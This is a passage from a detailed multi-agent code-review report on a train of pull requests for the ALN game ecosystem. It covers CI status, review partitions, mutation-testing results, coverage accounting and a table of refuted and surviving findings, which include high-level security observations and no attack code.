- **Test honesty** (P8a/P8b/S2 + Lens D): no `.skip`/`.only`/`expect(true)` in the train's new suites; five behavioural mutations of the backend rules each killed by a named test; the two drift tripwires fail on a mutated `game.json`. Lens D's full mutation table is in §4.5.
- **Injection** (Lens C, P5b, P6): backend `renderScoreboardHtml` is a single-pass dispatch with `jsonForScript` escaping (the SEC-1 fix holds); the config-tool client has no pack-to-innerHTML sink; the scanner escapes labels and glyphs (the one unescaped attribute sink is MAJOR 7).
- **Auth substrate** (P4, P5a, Lens C): every config-tool route is behind the operator token (21/21 probed); the observe token cannot reach any mutating `gm:command` (all 59 contract actions floor-mapped today); no secret-like content entered the tree in the slices GitGuardian flagged beyond the known `.env`.

## 3. Train-table integrity


### Head refs: recorded vs real (from the PR objects, not memory)
| # | Repo | PR | Table says | Real head (GitHub) | Match |
|---|---|---|---|---|---|
| 1 | ALN-TokenData | #6 | theme-unit @ 491c513 | claude/phase3-theme-unit @ 491c513b | yes |
| 2 | ALNScanner | #15 | theme-unit @ deddaf9 | claude/phase3-theme-unit @ deddaf997 | yes |
| 3 | ALNPlayerScan | #6 | foundations | claude/phase3-foundations @ 03429178 | yes (no SHA recorded) |
| 4 | arduino-cyd-player-scanner | #7 | foundations | claude/phase3-foundations @ 8bb93eb3 | yes (no SHA recorded) |
| 5–17 | ALN-Ecosystem | #19…#31 | chained slice branches | slice0 8a944b4, slice1 763d8ca, slice2 b137901, slice2b be24d96, 3a 4dee0aa, 3b 54e248c, 3c c1e11d7, slice5 094ca22, closers 00d39fe, slice4 d68948f, slice6 11893cd, slice7 4923575, theme 8752d53 | branch names match; no SHAs recorded |
| 18 | ALN-Ecosystem | #32 | claude/phase3-b0 | cbd4d328 | yes |
| 19 | ALN-Ecosystem | #33 | claude/phase3-docs-repair | 818a98a7 | yes |

Parent tip pins (git ls-tree on 818a98a): ALN-TokenData 491c513, ALNScanner deddaf9, aln-memory-scanner 0342917, arduino-cyd-player-scanner 8bb93eb — all four equal the submodule PR heads. ALNScanner's nested data/ pin = 491c513 (= TokenData head). PWA's nested data/ pin = 15d8d2e (unchanged from main; pre-v2).

### Chain (superset) check — git merge-base --is-ancestor, numeric PR order
main → slice0 → slice1 → slice2 → slice2b → 3a → 3b → 3c → slice5 → closers → slice4 → slice6 → slice7 → theme-unit → b0 → docs-repair: every link is an ancestor of the next. main (a4ebacd) is an ancestor of every head; every PR's base SHA is a4ebacd = current main (no drift). Submodule chains: TokenData #2 (0b5cd93) → #3 (1d323a7) → #4 (4f29720) → #5 (c44a8ef) → #6 (491c513) all ancestors of #6; ALNScanner #12 (d825179) → #13 (567dfa8) → #14 (46db231) → #15 (deddaf9) likewise. Merging #6/#15 first auto-resolves the subsumed PRs.

### CI status per vehicle (check runs on each head SHA, read 2026-09-05)
| Vehicle | Head | Test workflow on head | Note |
|---|---|---|---|
| TokenData #6 | 491c513 | no test workflow in repo; GitGuardian pass | data-only repo |
| ALNScanner #15 | deddaf9 | Unit / Build / Integration / Summary all green (2026-09-04) | |
| ALNPlayerScan #6 | 0342917 | Unit + manifest check green (2026-07-17) | |
| arduino #7 | 8bb93eb | PlatformIO native green (2026-07-17) | |
| #19 slice0 | 8a944b4 | NONE on head — head is a `[skip ci]` docs commit; last run (#75) green on 569d7e6; diff 569d7e6..8a944b4 = 1 line in PHASE3-STATUS.md | code identical to green SHA |
| #20 slice1 | 763d8ca | NONE on head — three `[skip ci]` docs commits after run #82 (green on 187c7a6); diff = docs only (2 files) | code identical to green SHA |
| #21 slice2 | b137901 | NONE on head — one `[skip ci]` docs commit after run #94 (green on 4b9464c); diff = docs only | code identical to green SHA |
| #22 slice2b | be24d96 | 8/8 green (2026-08-21) | |
| #23 3a | 4dee0aa | 8/8 green; GitGuardian FAIL | see security lens |
| #24 3b | 54e248c | 8/8 green; GitGuardian FAIL | |
| #25 3c | c1e11d7 | 8/8 green; GitGuardian FAIL | |
| #26 slice5 | 094ca22 | 8/8 green; GitGuardian FAIL | |
| #27 closers | 00d39fe | 8/8 green (2026-08-29) | |
| #28 slice4 | d68948f | 8/8 green (2026-09-03) | |
| #29 slice6 | 11893cd | 8/8 green (2026-09-03 run 33786647123: unit+contract, integration, E2E production leg, E2E toy leg, scanner, ESP32, scripts, summary) | the "watch it" vehicle — CONFIRMED green |
| #30 slice7 | 4923575 | two runs, both 8/8 green (2026-09-03) | |
| #31 theme | 8752d53 | run 204 (pull_request on #31) CANCELLED (Scanner Tests cancelled → Summary failure); a second run on the SAME SHA (33823135790) 8/8 green | see note below |
| #32 b0 | cbd4d32 | 8/8 green (2026-09-05) | GitGuardian neutral |
| #33 docs-repair | 818a98a | 8/8 green (2026-09-05) | GitGuardian neutral |

Note on #31: the run attributed to PR #31 itself (run 204) was cancelled mid-flight (Scanner Tests cancelled, so its Test Summary reads "failure"); run 205 (33823135790) was PR #32's first run, triggered at the identical head SHA 8752d53 when the b0 branch was cut, and passed all 8 jobs. The SHA is therefore CI-verified, but the #31 PR page shows a red Summary check — a walker reading the PR page would see red. Record it; not a code defect.

GitGuardian: FAILED on #23, #24, #25, #26 (slices 3a/3b/3c/5), passed on #22 and on #27+ (neutral on #32/#33). Security lens investigates what entered in that range.

**Result:** every recorded head matches the PR object; the superset chain holds link by link in the table's
order; all four parent pins equal the submodule PR heads. Three integrity notes for the walker: (1) #19, #20 and
#21 carry `[skip ci]` docs-only commits on top of their last green run, so their head SHAs have never run CI
(their code is byte-identical to a green SHA); (2) #31's own run on its head was cancelled and its PR page shows a
red Summary check, but the identical SHA passed 8/8 as PR #32's first run; (3) GitGuardian failed on #23–#26 and
passed afterwards; the security lens found no secret-like content entering in that range beyond the known
`.env`. #29, the "watch it" vehicle, is confirmed green on its head. CURRENT-STATE.md and ROADMAP.md still say
18 vehicles / #32 last while the table records 19 / #33 (F-P11b-2).

## 4. Method, coverage and process record
### 4.1 What was reviewed
Five three-dot diffs, each repo's `main` (= production-2026-07) against its train head:

| Repo | Range | Files | +/- |
|---|---|---|---|
| ALN-Ecosystem (parent) | a4ebacd...818a98a (`claude/phase3-docs-repair`, PR #33) | 366 | +39,636 / -2,432 |
| ALN-TokenData | 3e60fad...491c513 (`claude/phase3-theme-unit`, PR #6) | 14 | +1,654 / -34 |
| ALNScanner | e38c1ea...deddaf9 (`claude/phase3-theme-unit`, PR #15) | 80 | +7,193 / -580 |
| ALNPlayerScan | e14f4b7...0342917 (`claude/phase3-foundations`, PR #6) | 8 | +194 / -6 |
| arduino-cyd-player-scanner | af74fbd...8bb93eb (`claude/phase3-foundations`, PR #7) | 5 | +140 / -0 |
| **Total** | | **473** | |

The parent train is one diff because every vehicle is a stacked superset of its predecessor (verified, §4).

### 4.2 Partitions (every file assigned to exactly one; sums proven by script)
| Partition | Scope | Files | Reviewer model/effort |
|---|---|---|---|
| P1 | engine rules: gameRules/*, models, config, transaction/session/token services, validators, scanResponse, syncHelpers, broadcasts | 19 | Opus medium |
| P2 | packService, profileService, packRoutes, manifest builder, validate-pack | 5 | Opus medium |
| P3 | show-control services, cue engine, game clock, VLC/idle loop, display driver, adminEvents, profiles, scoreboard.html + fonts | 31 | Opus medium |
| P4 | OpenAPI/AsyncAPI/session-bundle contracts, auth middleware, gmAuth, socketServer, app.js, health/music/resource routes, .env.example, package.json | 13 | Opus high |
| P5a | config-tool server side (lib, server.js, tests, package files) | 27 | Opus medium |
| P5b | config-tool client (public/) | 30 | Opus medium |
| P6 | pack content + schemas (ALN-TokenData diff 14) + E2E fixture packs/profile + Notion sync scripts + tests | 19 + 14 | Opus medium |
| P7 | post-session validator scripts (backend/scripts/lib, validate-session) | 17 | Opus medium |
| P8a | backend unit tests: gameRules + pack/profile/scoring services | 19 | Opus medium |
| P8b | backend unit tests: middleware, websocket, show-control, utils, scripts, server | 30 | Opus medium |
| P9a | backend contract + integration tests | 16 | Opus medium |
| P9b | backend E2E flows/helpers/setup + rung1 harness | 31 | Opus medium |
| P10 | the four submodule pin lines | 4 | orchestrator + Lens A |
| P11a | operational docs + CI: workflows, CLAUDE.md, CONTEXT.md, DEPLOYMENT_GUIDE.md, backend/CLAUDE.md, SCORING_LOGIC.md, preflight, .gitignore, coverage thresholds | 12 | Opus medium |
| P11b | planning docs, ARCHIVE renames, agent docs, design pages, unslop skill | 93 | Sonnet low (mechanical sweep) |
| S1 | ALNScanner source (src/**, index.html, sw.js, data pin, docs) | 38 | Opus medium |
| S2 | ALNScanner tests | 42 | Opus medium |
| W+E | ALNPlayerScan diff (8) + ESP32 diff (5) | 13 | Opus medium |
| Lens A | cross-repo coherence (pins, MESSAGE_TYPES vs AsyncAPI, gm:command three-way, OpenAPI vs routes vs clients, schema single-sourcing, symlinks, versions, dist contents, parity-pack) | cross-cutting | Opus high |
| Lens B | scoring + duplicate parity, backend gameRules vs scanner LocalStorage/scoring, executed on both packs | cross-cutting | Opus high |
| Lens C | security + injection (sinks, path traversal, auth substrate, secrets, rung1, JSON handling, deps) | cross-cutting | Opus high |
| Lens D | test honesty by mutation (14 mutants across backend, scanner, config-tool, contracts) | cross-cutting | Opus high, run alone |
Parent partition sum: 19+5+31+13+27+30+19+17+19+30+16+31+4+12+93 = 366. Submodules: 14 (P6) + 38+42 (S1/S2) + 13 (W+E) = 107. Total 473.

### 4.3 Refutation
Every candidate finding went to an adversarial refuter whose brief was to disprove it with file:line evidence and to reproduce any run-based evidence itself: MAJOR → a Fable high-effort refuter; MINOR → an Opus refuter; NOTEs → one Opus batch per partition. A finding is listed only with its refuter's verdict. Surviving MAJORs were additionally reproduced by the orchestrator in a quiet tree after all agents finished.

### 4.4 Isolation and process record (stated so the reader can weigh the evidence)
- Trees: the train tip was checked out with all submodules at their train heads. Readers shared one read-only tree; every agent that executed tests had a private tree (git worktree + hardlinked node_modules + prebuilt scanner dist); the mutation lens had its own tree; refuters ran in two serialized lanes per workflow, one private tree each, so no two concurrently running agents executed tests in the same checkout. Tree integrity (`git status`, pin SHAs) was recorded for all 15 checkouts before launch and re-checked after.
- First wave (discarded/reused): an initial 20-agent fan-out shared one tree, including the mutation lens for a few minutes before it was moved; it also suffered one scratchpad collision (one agent deleted another's temp directory). That wave was interrupted; the ten partition reports that had COMPLETED before the interrupt (P2, P5a, P5b, P6, P7, P8a, P8b, P9a, P11a, P11b) were reused — their findings were extracted into the structured schema and every one went through refutation in an isolated tree, and any run-based evidence was reproduced there. Their "nothing found" results are credible because shared-tree contention can only produce spurious failures, not spurious passes. The other eleven partitions/lenses were re-run from scratch in the isolated design.
- A path typo in the workflow arguments (`/ALN-Ecosystem` suffix on private-tree paths) was worked around by the agents; the trees they actually used were verified from their reports.
- CPU: 4 cores. Test runs were limited to targeted files with `--maxWorkers=1`; timeouts were ruled out as evidence.

### 4.5 Lens D — mutation results
Lens D ran alone on the machine in its own tree (`train-mut`), after the four finder/refuter workflows had
finished. Baseline on the untouched tip: backend 141 suites / 2818 tests, scanner 86 / 1666, config-tool 180,
PWA 165, scripts 75, all green, zero skipped; the same five baselines re-run after every restore were identical.
Twenty mutants were applied one at a time (M3, M6, M8, M9, M10 and M12 split into sub-mutants), each followed by
a `git checkout` of the mutated file, with the final `git status --porcelain` empty in all seven checkouts.

| Mutant | Target | Result | Killed by |
|---|---|---|---|
| M1 | backend group bonus `(m−1)×base` → `m×base` | KILLED (8) | `gameRules/scoring … bonus = (multiplier − 1) × sum of member values` and 7 more |
| M2 | backend null/unknown `SF_MemoryType` scores 1× | KILLED (4) | `calculateTokenValue › should use unknown multiplier (0) for unknown type` and the D2b exact-case test |
| M3a | non-consuming claim registers as FCFS claimant | KILLED (2) | `duplicatePolicy › per-mode claims flag (D3s2) › a stored non-consuming transaction never registers` |
| M3b | FCFS ignores other teams | KILLED (7) | `checkDuplicate › rejects FCFS when ANY team already claimed the token (A7)` |
| M4 | unknown mode resolves to `scoringPolicy: 'standard'` | KILLED (4) | `pointsFor › returns 0 for a mode the config does not declare (never invents money)` |
| M5 | skip the `allowNegative` refusal in `adjustTeamScore` | KILLED (1) | `scoreFloor.test.js › rejects a zero-crossing adjustment with a named error` (note: a `transactionService` path filter stayed green at 490 tests; the pin lives in a differently named file) |
| M6a | capability gate (`requires` ⊆ engine caps) always passes | KILLED (1) | `packService › capability gate › refuses unknown required capabilities` |
| M6b | manifest sha1 verify always passes | KILLED (1) | scanner `PackLoader › sha1 mismatch discards staging and falls back` (the verify lives in the scanner) |
| M6c | `_readDiskGameConfig` parse-error path | **NO PIN EITHER WAY** | no test feeds the engine an invalid `game.json`; promoted to LD-1 (= MAJOR 3) |
| M7 | remove the single-pass dispatch in `renderScoreboardHtml` (SEC-1) | KILLED (1) | `pack-controlled text can NEVER become a substitution pattern` |
| M8a-i | drop the observe-token tier/class assertion | SURVIVED (2818 green) | **equivalent mutant**: the assertion sits behind the store-membership check, and the store has one writer that always stamps device/display; the store arm is pinned |
| M8a-ii | bypass the observe-token store check | KILLED (2) | `flushing observe tokens never touches a live GM session`; `the store is CAPPED` |
| M8b | `_authenticate` accepts any tier | SURVIVED (2818 green) | **equivalent mutant**: reachable only after `adminTokens` membership, whose one writer always sets tier `operator`; untested defence-in-depth, unreachable today |
| M9a | scanner group completion requires N−1 tokens | KILLED (1) | `LocalStorage › group completion › should award bonus when all group tokens collected` (amount assertion; no explicit "partial group pays nothing" test) |
| M9b | scanner drops `adminAdjustments` on rebuild | KILLED (3) | `deletion rebuild REPLAYS admin adjustments (backend parity)` |
| M10a | break the scanner exact-case type lookup | KILLED (3) | `Vendored Scoring Shim (ledger L2) › correct value for known memory types` and two more |
| M10b | scanner unknown type → 1× | KILLED (1) | `should return 0 for unknown memory types` (twin of M2) |
| M11 | remove the glyph-sink escape | KILLED (2) | `glyph sink escaping (§4a O1) › a markup-bearing glyph reaches the DOM as TEXT` |
| M12a | config-tool login accepts any password | KILLED (2) | `toolAuth › login › refuses a wrong password`; `POST /api/auth/login … 401 for wrong` |
| M12b | config-tool accepts an orchestrator-audience token | KILLED (2) | `refuses an orchestrator-aud token signed with the SAME secret` |
| M13 | remove `'service:state'` from scanner `MESSAGE_TYPES` | KILLED by the parent only | backend `client-contract-conformance › MESSAGE_TYPES equals the subscribe oneOf set (WS-2)`; the scanner's own 1586 tests stayed green → LD-2 (NOTE) |
| M14 | rename one AsyncAPI event | KILLED (12) | WS-2 conformance plus the `group:completed` inbound and score-events contract blocks |

Result: 18 of 20 mutants killed by a named test; the two survivors are provably equivalent mutants (dead
defence-in-depth), not gaps. In 14 of the 18 kills the failing test's own title states the mutated rule. The one
real gap (M6c) is MAJOR 3 above, found independently by P2 by reading and by Lens D by mutation.

Lens D findings and their refuter verdicts: LD-1 (MAJOR, the corrupt-`game.json` acceptance; a second, independent
statement of MAJOR 3 using a truncated copy of the real ALN pack, which activates with the healthy pack's
identity and `contentHash`): SURVIVES-NARROWED, MAJOR (Fable refuter, reproduced). The narrowing: the config tool's own publish path is atomic and validates through the same gate, so it cannot produce a corrupt `game.json`; the reachable routes are a hand edit on the machine, a merge-conflict marker, or a `PACK_PATH` pack. Merged into MAJOR 3 (§5). LD-2 (NOTE, the `MESSAGE_TYPES` cross-repo pin lives only in the parent
repo's contract test, so a scanner-only drift is green in the scanner's own CI and surfaces at the last train
vehicle; documented as deliberate in the scanner test): SURVIVES-NARROWED, NOTE (Opus refuter, reproduced). The drift is always caught before `main` by the parent contract job; what remains is a merge-ordering exposure in the train (scanner vehicles merge before the parent vehicle that carries the pin). Optional hardening, not blocking.

Process note: the Lens D finder was paused by the account's usage limit after it had recorded every verdict and
written its report; the workflow's automatic retry spawned a second finder that made zero tool calls before the
same limit, and the workflow returned null for the item. After the limit reset the paused finder was resumed
from its transcript and returned its result; its tree was re-verified clean at the train pins; and the workflow
run was resumed with the result supplied as input so that Lens D's refutation ran inside the same isolated,
journaled pipeline as every other partition's.


### 4.6 Coverage proof and agent accounting
**Files.** 473 files across the five diffs; every one assigned to exactly one partition (§4.2; sums verified by
script). Per-partition reconciliation of each reviewer's "fully read ∪ skimmed" list against the partition file
list (script `coverage_check.py`, run on the structured outputs):

| Partition | Files | Reconciled | Gap and how it was closed |
|---|---|---|---|
| P1 | 19 | 19/19 | — |
| P2 | 5 | 5/5 | — |
| P3 | 31 | 15/31 | the 16 `backend/public/fonts/*.woff2` binaries: orchestrator verified all 16 exist, carry the `wOF2` magic, and are each referenced exactly once by `fonts.css` |
| P4 | 13 | 13/13 | — |
| P5a | 27 | 27/27 | `package-lock.json` audited programmatically (all deps resolved, registry-only URLs) |
| P5b | 30 | 30/30 | 12 woff2 inspected at byte level by the reviewer; `timelineView.js` diff-only (1-line change) |
| P6 | 19 + 14 | 33/33 | — |
| P7 | 17 | 17/17 | — |
| P8a | 19 | 19/19 | — |
| P8b | 30 | 30/30 | — |
| P9a | 16 | 16/16 | two large pre-existing files read as diff + full head + all test titles (stated in the report) |
| P9b | 31 | 31/31 | — |
| P10 | 4 | 4/4 | pins verified by orchestrator and Lens A |
| P11a | 12 | 12/12 | — |
| P11b | 93 | 93/93 | 49 renames verified R100; bodies grep-swept rather than read narratively (stated) |
| S1 | 38 | 38/38 | — |
| S2 | 42 | 42/42 | 19 of 42 skimmed with reasons (branch diff read in full for each) |
| W+E | 13 | 12/13 | `aln-memory-scanner/assets/manifest.json`: read by P6 (F-P6-3) and by Lens A (LA-5) and the orchestrator |
| **Total** | **473** | **473/473** | |

Coverage bounds accepted and stated: the four cross-cutting lenses cover scope, not file lists; P11b's 44 non-renamed
planning documents were swept mechanically (secrets, dates, broken links, vehicle counts), not reviewed as designs;
no Playwright E2E suite was executed (no VLC/Chromium venue stack here), so E2E flows were reviewed by reading and
their pack-derived oracle was analysed, not run; the ESP32 firmware was reviewed by reading plus its native unit
tests, not on hardware.

**Agents.** First wave (discarded design, see §4.3): 23 launched, 10 finder reports completed and reused, 13
killed at the interrupt. Workflow wave: W1 (backend) 20 agents, W2 (scanner + devices) 13, W3 (lenses) 18, W4
(extraction + refutation of the reused reports) 41, W5 (Lens D alone) 4 (2 finder attempts, 2 refuters). Zero agent errors and zero null results in W1–W4. W5's first run had its two finder attempts
stopped by the account's usage limit (§4.5); after the reset the paused finder was resumed from its transcript and the
run was resumed so its two refuters ran inside the workflow with zero errors. Extractor fidelity: 10/10 reused reports extracted with
finding counts equal to the source's heading counts.

**Findings and verdicts.** 111 candidate findings from 22 partitions and lenses (109 from the finder/extractor waves, 2 from Lens D); 6 refuted; 105 survive; after merging 10 cross-partition duplicates (§5): 8 MAJOR (a ninth MAJOR candidate was downgraded to MINOR by its refuter), 34 MINOR, 53 NOTE. Every finding received exactly one refuter verdict (NOTEs in per-partition
batches); no finding is listed without one. Every surviving MAJOR was reproduced by the orchestrator after the
four finder/refuter workflows completed, in a tree no agent was using (Lens D was running in its own isolated tree
at the time; the reproductions are deterministic node executions and supertest calls, not timing-sensitive suites).

**Trees.** 15 checkouts (1 shared reader tree, 1 mutation tree, 5 private finder trees, 8 refuter lane trees)
recorded clean with their pin SHAs before launch and re-verified clean after every workflow, including after
Lens D. No stray processes at the end.

**Evidence bundle.** The 21 finder reports, 100+ refuter verdict files, the structured workflow outputs, the
journals, the reproduction scripts and their outputs live in this session's scratchpad
(`scratchpad/findings/`, `scratchpad/wf/{reports,refutations,scratch,repro}/`). They are not pushed with this
report; they can be pushed as a companion directory on request.


## 5. Duplicate merges across partitions
| Kept | Merged duplicate(s) | Agreement |
|---|---|---|
| F-P5a-2 | F-P5b-1 (preset export 401) | both SURVIVES-NARROWED, MINOR |
| F-P2-5 | F-P8a-2 (display shim not drift-pinned) | SURVIVES MINOR / SURVIVES NOTE (severity kept MINOR: the ledger relies on the tripwire) |
| S1-2 | S2-1 (theme.js has no coverage floor) | both SURVIVES, MINOR |
| LB-3 | S1-3 (scanner prototype-chain type lookup) | SURVIVES-NARROWED MINOR / SURVIVES NOTE |
| LB-2 | S1-4 (scanner does not floor token values) | SURVIVES MINOR / SURVIVES NOTE |
| F-P11a-6 | F-P8b-2 (backend coverage floors missing) | both NOTE |
| LA-6 | WE-2 (`/api/assets/manifest` `pack` field undocumented) | both NOTE after refutation |
| LA-3 | WE-3 (PWA pre-v2 pin, pack display inert) | MINOR / NOTE |
| LA-5 | F-P6-3 (committed asset manifest predates pack identity) | MINOR (narrowed: not stale vs disk, but unfiltered) / NOTE |
| LC-1 | F-P5b-2 (cue editor writes schema-illegal `icon`) | the authoring side of the same hole; kept separate (MAJOR sink / MINOR editor) |
| F-P2-1 | LD-1 (corrupt `game.json` accepted; found by mutation, proven on a truncated real ALN pack) | both MAJOR; both refuters narrow the config-tool publish leg the same way |
| P1-1 | LB-1, LB-5 (reset semantics, backend vs standalone vs dialog) | related, kept separate: different code, different fixes |


## Appendix A — NOTE-level findings (60 survive refutation; none blocks the walk)

| # | Repo | File:line | Finding | Verdict |
|---|---|---|---|---|
| P4-5 | ALN-Ecosystem | `backend/contracts/README.md:50` | Contracts README HTTP endpoint inventory is stale in both count and list | SURVIVES-NARROWED |
| P4-6 | ALN-Ecosystem | `backend/src/app.js:119-122` | OpenAPI/Express inventory gap: /scoreboard (the observe-token mint point) is undocumented, and resourceRoutes  | SURVIVES |
| P4-7 | ALN-Ecosystem | `backend/src/middleware/auth.js:243-256` | 403 responses emit error code FORBIDDEN, which is outside the documented OpenAPI Error enum (currently unreach | SURVIVES |
| P9b-2 | ALN-Ecosystem | `backend/tests/e2e/helpers/scoring.js:40-56, 116-134` | Non-scoring pack loaders swallow transport failure into null, so a broken pack channel is green on the product | SURVIVES-NARROWED |
| P9b-4 | ALN-Ecosystem | `backend/tests/rung1/generate-fixtures.js:78-107` | rung-1 writes placeholder show media into the repo tree and nothing removes it | SURVIVES |
| P9b-6 | ALN-Ecosystem | `backend/tests/e2e/flows/30-full-game-session-multi-device.te:700-726` | Flow 30's score expectation is read back from the engine's own rendered scoreboard | SURVIVES |
| P9b-8 | ALN-Ecosystem | `backend/tests/rung1/up.sh:88-90, 163-181` | rung-1 leaves the Home Assistant token and a world-writable session bus behind in /tmp | SURVIVES |
| P9b-9 | ALN-Ecosystem | `.github/workflows/rung1.yml:12-27 (and capabilit` | Neither new workflow declares permissions:; the capability probe has no concurrency guard | SURVIVES-NARROWED |
| S2-2 | ALNScanner | `tests/unit/ui/uiManager.test.js:315-320 and 326-331` | Two uiManager tests cannot fail: toBeDefined() on a DOM lookup that returns null | SURVIVES-NARROWED |
| S2-3 | ALNScanner | `tests/app/initializationSteps.test.js:34` | The segmented-selector pin is a tautology: `?.dataset.arg ?? 'blackmarket'` compared to 'blackmarket' | SURVIVES |
| S2-4 | ALNScanner | `tests/unit/ui/renderers/GameOpsRenderer.rating.test.js:83-95` | The 'ESCAPE PIN' case is vacuous and its comment over-claims; the load-bearing pin is in GameOpsRenderer.glyph | SURVIVES |
| S2-5 | ALNScanner | `tests/contract/fixtures/report/sparse-golden.md:13, 26, 31 (source: ` | The session report renders negative money two different ways in one document, and the new golden freezes the i | SURVIVES |
| S1-3 | ALNScanner | `src/core/scoring.js:205-211` | Scanner calculateTokenValue still resolves memory types through the prototype chain; the backend twin was hard | SURVIVES |
| S1-4 | ALNScanner | `src/core/scoring.js:211` | Scanner does not floor the token value the backend floors — fractional multipliers diverge across the parity s | SURVIVES |
| WE-2 | ALNPlayerScan | `backend/contracts/openapi.yaml:/api/assets/manifest` | The `pack` block added to /api/assets/manifest is undocumented in openapi.yaml — contract-first violation, unc | SURVIVES-NARROWED |
| WE-3 | ALNPlayerScan | `aln-memory-scanner/js/app.js:99-102 (plus the dat` | PWA standalone A2 pack display is inert at the train tip — the pinned data/ submodule has no pack-manifest.jso | SURVIVES-NARROWED |
| WE-4 | ALNPlayerScan | `backend/tests/contract/scanner/request-schema-validation.tes:19-63 (claim at CLAU` | Scanner request-schema contract test validates hand-copied literals, not scanner payload construction | SURVIVES |
| LC-4 | ALN-Ecosystem | `backend/ssl/key.pem:1` | Committed TLS private key for the orchestrator's LAN identity | SURVIVES |
| LC-6 | ALN-Ecosystem | `.github/workflows/rung1.yml:23-30 (also .github/` | Parent-repo workflows declare no permissions block; third-party actions pinned by tag not SHA | SURVIVES-NARROWED |
| LA-4 | ALNPlayerScan | `aln-memory-scanner/tests/app.test.js:688-702` | False green: the PWA standalone pack-identity test mocks fetch and asserts against ./data/pack-manifest.json,  | SURVIVES-NARROWED |
| LA-6 | ALN-Ecosystem | `backend/contracts/openapi.yaml:307-361` | OpenAPI's /api/assets/manifest response schema omits the `pack` field the generator emits and the ESP32 consum | SURVIVES |
| LA-7 | ALN-Ecosystem | `backend/src/websocket/gmAuth.js:178` | Backend emits gm:identified, which is in no contract and no client, while AsyncAPI says the pattern was replac | SURVIVES-NARROWED |
| LA-8 | ALN-Ecosystem | `backend/src/routes/resourceRoutes.js:225` | GET /scoreboard and /scoreboard.html are served endpoints with no entry in openapi.yaml | SURVIVES |
| LA-9 | ALNScanner | `ALNScanner/docs/PLAYWRIGHT_TESTING_GUIDE.md:174, 179, 502, 526` | The tip's Playwright guide prescribes `#historyContainer .transaction-card`, a class no renderer emits | SURVIVES |
| F-P2-4 | ALN-Ecosystem | `backend/src/services/packService.js:962-964 (modes loop)` | The modes drivability loop has none of the malformed-entry guarding the phases loop has: a null mode entry cra | SURVIVES-NARROWED |
| F-P2-6 | ALN-Ecosystem | `backend/src/services/packService.js:638-648, used at 670` | An unparseable or 4-part engine.minVersion silently satisfies the version gate | SURVIVES |
| F-P2-7 | ALN-Ecosystem | `backend/src/services/packService.js:1182-1197 (getManife` | The disk-drift warn compares manifest-to-manifest only: a pack content edit without a manifest rebuild is comp | SURVIVES |
| F-P2-8 | ALN-Ecosystem | `backend/src/services/profileService.js:198-202 (getProfileI` | The active installation profile's identity is never surfaced anywhere; forPack is read and discarded | SURVIVES |
| F-P5b-7 | ALN-Ecosystem | `config-tool/public/js/utils/vocabulary.js:32 and 64; consumed ` | Prototype-chain lookups reintroduce the C11 class the engine explicitly hardened against — a hand-broken pack  | SURVIVES |
| F-P5b-8 | ALN-Ecosystem | `config-tool/public/js/utils/api.js:95-101; server side ` | Publish clears the client's draft but the server keeps it (re-stamped) — the next reload shows a phantom "unpu | SURVIVES |
| F-P5b-9 | ALN-Ecosystem | `config-tool/public/js/sections/packs.js:289-293 (VARIANTS/NA` | Pack-manager prototype: variant D is unreachable from its own switcher, and re-rendering stacks duplicate swit | SURVIVES |
| F-P5b-10 | ALN-Ecosystem | `config-tool/public/js/sections/economy.js:141 (called from ren` | economy.js interpolates a pack-controlled key into a CSS selector — an exotic memory-type name throws and kill | SURVIVES |
| F-P6-1 | ALN-Ecosystem | `scripts/sync_notion_to_tokens.py:851-864` | write_tokens_json emits no trailing newline, so the next sync will churn tokens.json and the pack contentHash  | SURVIVES |
| F-P6-2 | ALN-TokenData | `CLAUDE.md:15-30` | ALN-TokenData/CLAUDE.md's file-structure block (updated by this train) omits three of the five inventoried pac | SURVIVES |
| F-P6-3 | ALN-Ecosystem | `scripts/generate_asset_manifest.py:87-122` | The committed ESP32 asset manifest predates the A2 pack identity field, so the boot-log pack identity the docs | SURVIVES |
| F-P7-2 | ALN-Ecosystem | `backend/scripts/lib/ReportGenerator.js:122-128` | The report prints the NON-scoring per-mode breakdown as a sub-list of "Scoring transactions" | SURVIVES |
| F-P7-3 | ALN-Ecosystem | `backend/scripts/lib/validators/GroupBonusCheck.js and .../Tr:whole files; wiring ` | Two validators changed by this train are unreachable dead code | SURVIVES-NARROWED |
| F-P7-4 | ALN-Ecosystem | `backend/scripts/lib/ScoringCalculator.js:114-126` | The engine-parity fix in calculateFromRatingAndType lands on dead code | SURVIVES |
| F-P7-5 | ALN-Ecosystem | `scripts/README.md:49` | scripts/README.md still names the retired scoring-config.json as the memory-type source of truth (not this par | SURVIVES |
| F-P8a-1 | ALN-Ecosystem | `backend/tests/unit/services/tokenService.test.js:16, 90-98` | Two tautological multiplier assertions in tokenService.test.js | SURVIVES |
| F-P8a-2 | ALN-Ecosystem | `backend/tests/unit/services/packService.test.js:1071-1075, 1420-1428` | Legacy scoring shim's 'display' field not covered by drift tripwire | SURVIVES |
| F-P8a-3 | ALN-Ecosystem | `backend/tests/unit/services/packService.test.js:256, 1289` | Two test titles overstate what their bodies test | SURVIVES |
| F-P8b-1 | ALN-Ecosystem | `backend/tests/unit/utils/fontSelfHosting.test.js:11-12,23` | L11 font-CDN tripwire states a repo-wide invariant that is false on the tip and is scoped to never see the cou | SURVIVES |
| F-P8b-2 | ALN-Ecosystem | `backend/.coverage-thresholds.json:n/a (82 entries, no ` | Three new backend/src modules — including the authorization floor table — landed with no per-file coverage flo | SURVIVES |
| F-P8b-3 | ALN-Ecosystem | `backend/tests/unit/services/displayControlService.test.js:245-246` | The pack scoreboard-opt-out test stubs the method under test, so the real _scoreboardEnabled() opt-out branch  | SURVIVES |
| F-P8b-4 | ALN-Ecosystem | `backend/tests/unit/services/lightingRoleTripwire.test.js:15-16` | Stale docstring on the L7 lighting tripwire claims it iterates zero entries; it now iterates seven | SURVIVES |
| F-P8b-5 | ALN-Ecosystem | `backend/tests/unit/websocket/socketMiddleware.test.js:290-308` | Pre-existing placeholder test that cannot fail (expect(true).toBe(true)) | SURVIVES-NARROWED |
| F-P9a-1 | ALN-Ecosystem | `backend/tests/integration/cue-engine.test.js:474-483, 493-503` | The phase-cue negative-match decoy asserts nothing — the guard its comment claims does not exist | SURVIVES |
| F-P9a-2 | ALN-Ecosystem | `backend/tests/contract/websocket/sync-full-completeness.test:82-85, 102-105` | sync:full completeness pin checks key presence, not that the key survives serialization | SURVIVES |
| F-P9a-3 | ALN-Ecosystem | `backend/tests/contract/profile/installation-profile-schema.t:97-104` | The second real installation profile is never schema-validated, and nothing validates a profile at load | SURVIVES |
